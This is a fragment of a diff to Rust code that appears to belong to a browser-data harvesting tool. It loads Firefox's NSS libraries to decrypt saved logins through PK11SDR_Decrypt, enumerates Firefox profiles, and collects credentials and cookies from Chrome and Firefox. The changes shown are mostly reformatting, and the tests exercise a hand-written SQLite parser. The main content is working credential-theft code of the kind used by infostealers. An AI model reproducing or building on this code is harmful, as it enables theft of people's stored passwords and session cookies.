+    )
+    .ok_or_else(|| anyhow!("GetProcAddress resolve failed"))?;
 
     let mozglue_path = install_dir.join("mozglue.dll");
     let nss3_path = install_dir.join("nss3.dll");
 
-    let mozglue_cstr = CString::new(mozglue_path.to_string_lossy().as_ref())
-        .context("CString mozglue path")?;
-    let nss3_cstr = CString::new(nss3_path.to_string_lossy().as_ref())
-        .context("CString nss3 path")?;
+    let mozglue_cstr =
+        CString::new(mozglue_path.to_string_lossy().as_ref()).context("CString mozglue path")?;
+    let nss3_cstr =
+        CString::new(nss3_path.to_string_lossy().as_ref()).context("CString nss3 path")?;
 
     // mozglue must be loaded first.
     let h_mozglue = load_library_a(mozglue_cstr.as_ptr());
@@ -2057,13 +2170,13 @@ unsafe fn load_nss(install_dir: &Path) -> Result<(HMODULE, HMODULE, NssFunctions
     type SecitemFreeItemFn = unsafe extern "C" fn(*mut SecItem, c_int);
 
     let fns = NssFunctions {
-        nss_init:                   resolve!(h_nss3, "NSS_Init",                   NssInitFn),
-        nss_shutdown:               resolve!(h_nss3, "NSS_Shutdown",               NssShutdownFn),
-        pk11_get_internal_key_slot: resolve!(h_nss3, "PK11_GetInternalKeySlot",    Pk11GetSlotFn),
-        pk11_check_user_password:   resolve!(h_nss3, "PK11_CheckUserPassword",     Pk11CheckPwFn),
-        pk11_free_slot:             resolve!(h_nss3, "PK11_FreeSlot",              Pk11FreeSlotFn),
-        pk11sdr_decrypt:            resolve!(h_nss3, "PK11SDR_Decrypt",            Pk11SdrDecryptFn),
-        secitem_free_item:          resolve!(h_nss3, "SECITEM_FreeItem",           SecitemFreeItemFn),
+        nss_init: resolve!(h_nss3, "NSS_Init", NssInitFn),
+        nss_shutdown: resolve!(h_nss3, "NSS_Shutdown", NssShutdownFn),
+        pk11_get_internal_key_slot: resolve!(h_nss3, "PK11_GetInternalKeySlot", Pk11GetSlotFn),
+        pk11_check_user_password: resolve!(h_nss3, "PK11_CheckUserPassword", Pk11CheckPwFn),
+        pk11_free_slot: resolve!(h_nss3, "PK11_FreeSlot", Pk11FreeSlotFn),
+        pk11sdr_decrypt: resolve!(h_nss3, "PK11SDR_Decrypt", Pk11SdrDecryptFn),
+        secitem_free_item: resolve!(h_nss3, "SECITEM_FreeItem", SecitemFreeItemFn),
     };
 
     Ok((h_mozglue, h_nss3, fns))
@@ -2100,10 +2213,7 @@ fn find_firefox_profiles() -> Vec<PathBuf> {
         Err(_) => return Vec::new(),
     };
 
-    let profiles_ini = appdata
-        .join("Mozilla")
-        .join("Firefox")
-        .join("profiles.ini");
+    let profiles_ini = appdata.join("Mozilla").join("Firefox").join("profiles.ini");
     let content = match fs::read_to_string(&profiles_ini) {
         Ok(c) => c,
         Err(_) => return Vec::new(),
@@ -2119,10 +2229,7 @@ fn find_firefox_profiles() -> Vec<PathBuf> {
             // Flush previous profile.
             if let Some(path) = current_path.take() {
                 let full = if is_relative {
-                    profiles_ini
-                        .parent()
-                        .unwrap_or(Path::new(""))
-                        .join(&path)
+                    profiles_ini.parent().unwrap_or(Path::new("")).join(&path)
                 } else {
                     PathBuf::from(&path)
                 };
@@ -2140,10 +2247,7 @@ fn find_firefox_profiles() -> Vec<PathBuf> {
     // Flush last.
     if let Some(path) = current_path {
         let full = if is_relative {
-            profiles_ini
-                .parent()
-                .unwrap_or(Path::new(""))
-                .join(&path)
+            profiles_ini.parent().unwrap_or(Path::new("")).join(&path)
         } else {
             PathBuf::from(&path)
         };
@@ -2334,7 +2438,9 @@ pub fn collect_firefox_data(data_type: &common::BrowserDataType) -> BrowserDataR
             data_type,
             common::BrowserDataType::Cookies | common::BrowserDataType::All
         ) {
-            result.cookies.extend(collect_firefox_cookies(&profile_dir, "Firefox"));
+            result
+                .cookies
+                .extend(collect_firefox_cookies(&profile_dir, "Firefox"));
         }
 
         if !slot.is_null() {
@@ -2370,7 +2476,10 @@ pub fn collect_browser_data(
 
     let target = browser.unwrap_or(common::BrowserType::All);
 
-    if matches!(target, common::BrowserType::Chrome | common::BrowserType::All) {
+    if matches!(
+        target,
+        common::BrowserType::Chrome | common::BrowserType::All
+    ) {
         let partial = collect_chrome_data(&data_type);
         result.credentials.extend(partial.credentials);
         result.cookies.extend(partial.cookies);
@@ -2382,7 +2491,10 @@ pub fn collect_browser_data(
         result.cookies.extend(partial.cookies);
     }
 
-    if matches!(target, common::BrowserType::Firefox | common::BrowserType::All) {
+    if matches!(
+        target,
+        common::BrowserType::Firefox | common::BrowserType::All
+    ) {
         let partial = collect_firefox_data(&data_type);
         result.credentials.extend(partial.credentials);
         result.cookies.extend(partial.cookies);
@@ -2423,10 +2535,14 @@ mod tests {
 
         // === Database header (first 100 bytes of page 1) ===
         db[0..16].copy_from_slice(b"SQLite format 3\0");
-        db[16] = 0x10; db[17] = 0x00; // page size = 4096
-        db[18] = 1; db[19] = 1;       // file format version
-        db[20] = 0;                    // reserved bytes per page
-        db[21] = 64; db[22] = 32; db[23] = 32; // max/min payload fractions
+        db[16] = 0x10;
+        db[17] = 0x00; // page size = 4096
+        db[18] = 1;
+        db[19] = 1; // file format version
+        db[20] = 0; // reserved bytes per page
+        db[21] = 64;
+        db[22] = 32;
+        db[23] = 32; // max/min payload fractions
         db[24..28].copy_from_slice(&1u32.to_be_bytes()); // change counter
         db[28..32].copy_from_slice(&1u32.to_be_bytes()); // db size in pages
         db[32..36].copy_from_slice(&0u32.to_be_bytes()); // first trunk page
@@ -2440,14 +2556,18 @@ mod tests {
 
         // === Leaf table page header (at offset 100 of page 1) ===
         db[100] = PAGE_TYPE_LEAF_TABLE;
-        db[101] = 0; db[102] = 0;  // first freeblock = none
-        db[103] = 0; db[104] = 1;  // cell count = 1 (for the schema row)
-        // cell content area offset (will be filled below)
-        db[105] = 0x0F; db[106] = 0xA0; // = 4000 decimal
-        db[107] = 0;                     // fragmented free bytes
+        db[101] = 0;
+        db[102] = 0; // first freeblock = none
+        db[103] = 0;
+        db[104] = 1; // cell count = 1 (for the schema row)
+                     // cell content area offset (will be filled below)
+        db[105] = 0x0F;
+        db[106] = 0xA0; // = 4000 decimal
+        db[107] = 0; // fragmented free bytes
 
         // Cell pointer for schema row at page offset 4000
-        db[108] = 0x0F; db[109] = 0xA0;
+        db[108] = 0x0F;
+        db[109] = 0xA0;
 
         // === Schema row at page offset 4000 ===
         // Row: type="table", name="t1", tbl_name="t1", rootpage=1, sql=<sql>
@@ -2470,12 +2590,17 @@ mod tests {
         let payload: Vec<u8> = {
             let mut p = Vec::new();
             // header: [6][23][17][17][9][85]
-            p.push(6u8); p.push(23u8); p.push(17u8); p.push(17u8); p.push(9u8); p.push(85u8);
+            p.push(6u8);
+            p.push(23u8);
+            p.push(17u8);
+            p.push(17u8);
+            p.push(9u8);
+            p.push(85u8);
             // values
             p.extend_from_slice(rec_type);
             p.extend_from_slice(rec_name);
             p.extend_from_slice(rec_name); // tbl_name = name
-            // rootpage = 1 (stype 9 = literal 1, no bytes)
+                                           // rootpage = 1 (stype 9 = literal 1, no bytes)
             p.extend_from_slice(rec_sql);
             p
         };
@@ -2503,7 +2628,11 @@ mod tests {
         // The schema itself is in page 1; t1 rootpage is also 1 so we'll
         // read the schema rows as "t1" rows (they share the page in our test DB).
         let rows = sqlite_read_table(&db, "t1");
-        assert!(rows.is_ok(), "sqlite_read_table should succeed: {:?}", rows.err());
+        assert!(
+            rows.is_ok(),
+            "sqlite_read_table should succeed: {:?}",
+            rows.err()
+        );
     }
 
     #[test]
@@ -2511,9 +2640,9 @@ mod tests {
         // Header: [header_size=4][stype_null=0][stype_int1=9][stype_text_hello=23(0x17)]
         // Values: (no bytes for NULL, no bytes for INT9, 5 bytes "hello")
         let mut payload = Vec::new();
-        payload.push(4u8);  // header size = 4
-        payload.push(0u8);  // NULL
-        payload.push(9u8);  // INT literal 1
+        payload.push(4u8); // header size = 4
+        payload.push(0u8); // NULL
+        payload.push(9u8); // INT literal 1
         payload.push(23u8); // TEXT len=5
         payload.extend_from_slice(b"hello");
         let vals = parse_record(&payload);
